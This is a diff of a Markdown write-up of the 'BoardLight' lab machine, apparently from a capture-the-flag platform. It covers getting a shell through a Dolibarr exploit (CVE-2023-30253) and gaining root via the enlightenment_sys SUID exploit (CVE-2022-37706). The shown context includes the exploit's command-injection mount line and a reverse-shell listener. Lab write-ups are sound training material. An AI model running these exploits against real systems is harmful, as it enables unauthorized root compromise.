@@ -39,9 +39,8 @@ created: 2025-08-16
 **📚 Learned:**  
 
 - Look for a domain name somewhere if nothing comes up.
-- Always try default/weak credentials (use `creds`).
+- Always try default/weak credentials.
 - Again, password reuse.
-- Even if a binary isn't on `GTFOBins`, it's still worth searching for exploits.
 - The correct syntax for `su` is `su - <user>` or just `su -` if becoming root.
 
 ----
@@ -49,13 +48,12 @@ created: 2025-08-16
 ## 🌐 Port Scan
 
 - **TCP**: 22, 80
-- **UDP**: None
 
 ---
 
 ## 🔍 Enumeration
 
-The only port worth enumerating was `80`, and it was a web server hosting a website for a company's cybersecurity services.
+Port 80 was a web server hosting a website for a company's cybersecurity services.
 
 ![[Pasted image 20250817123437.png]]
 
@@ -118,12 +116,12 @@ creds search dolibarr
 
 ## 🪜 Foothold
 
-The app has an interesting feature for creating websites, but I couldn't create a site with `PHP`, so I started looking for exploits. I found [this](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253) exploit for `CVE-2023-30253`, a vulnerability that affects `Dolibarr` versions before `17.0.1`. This vulnerability allows remote code execution by any authenticated user via an uppercase manipulation (`<?PHP` instead of `<?php`) in injected data.
+The app has an interesting feature for creating websites, but I couldn't create a site with `PHP`, so I started looking for exploits. I found [this exploit](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253) for `CVE-2023-30253`, a vulnerability that affects `Dolibarr` versions before `17.0.1`. This vulnerability allows remote code execution by any authenticated user via an uppercase manipulation (`<?PHP` instead of `<?php`) in injected data.
 
 I downloaded the exploit, started a listener, ran the exploit, and got a shell as `www-data`.
 
 ```shell
-listen linux 1234
+penelope -p 1234
 ```
 
 ```shell
@@ -174,7 +172,7 @@ We can now `SSH` into the machine.
 
 ## 🛡️ Privilege Escalation
 
-User `larissa` is a member of the `adm` group. This group lets its members read several logs from `/var/log/`. The logs were a rabbit hole. After more enumeration I found `SUID` files related to the `enlightenment` window manager. I found [this](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) exploit, which escalates privileges through the `SUID` binary `enlightenment_sys`. It's a very short `bash` script, so here is its full source code:
+User `larissa` is a member of the `adm` group. This group lets its members read several logs from `/var/log/`. The logs were a rabbit hole. After more enumeration I found `SUID` files related to the `enlightenment` window manager. I found [this exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit), which escalates privileges through the `SUID` binary `enlightenment_sys`. It's a very short `bash` script, so here is its full source code:
 
 ```shell
 #!/bin/bash
@@ -202,7 +200,9 @@ echo "[+] Enjoy the root shell :)"
 ${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
 ```
 
-I transferred it to the target, ran it, and got root. For learning purposes I tried running this exploit as user `www-data` and found that it doesn't have enough permissions, so becoming `larissa` first was necessary.
+I transferred it to the target, ran it, and got root.
+
+For learning purposes I tried running this exploit as user `www-data` and found that it doesn't have enough permissions, so becoming `larissa` first was necessary.
 
 ```shell
 www-data@boardlight:/tmp$ ./e.sh
